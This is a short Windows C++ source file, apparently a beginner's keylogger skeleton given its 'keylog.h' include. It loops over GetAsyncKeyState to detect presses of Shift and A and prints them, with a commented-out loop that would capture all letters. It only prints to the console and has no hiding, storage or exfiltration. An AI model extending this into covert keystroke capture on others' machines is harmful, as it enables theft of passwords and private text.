#include <windows.h>
#include <stdio.h>
#include "./keylog.h"

#define WIN32_LEAN_AND_MEAN

struct KeyChecker{
  short key = 0;
  bool check = false;
  bool get(){
    if(key & 0x0001){
      if(!check){
        check = true;
        return 1;
      }
    }

    if(key & 0x8000){
    }else{
      check = false;
    }
    return 0;
  }
};

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
  struct KeyChecker SHIFT;
  struct KeyChecker A;

  while(true){
    // int c, k;

    SHIFT.key = GetAsyncKeyState(VK_SHIFT);
    A.key = GetAsyncKeyState('A');

    if(SHIFT.get()){
      printf("Shift");
    }

    if(A.get()){
      printf("A");
    }

    // for(c = 'A'; c <= 'Z'; c++){
    //   if(Shift) k = c;
    //   else k = c + ('a' - 'A');
    //   if(GetAsyncKeyState(c)){
    //     printf("%c", (char)k);
    //   }
    // }
    Sleep(50);
  }
  return 0;
}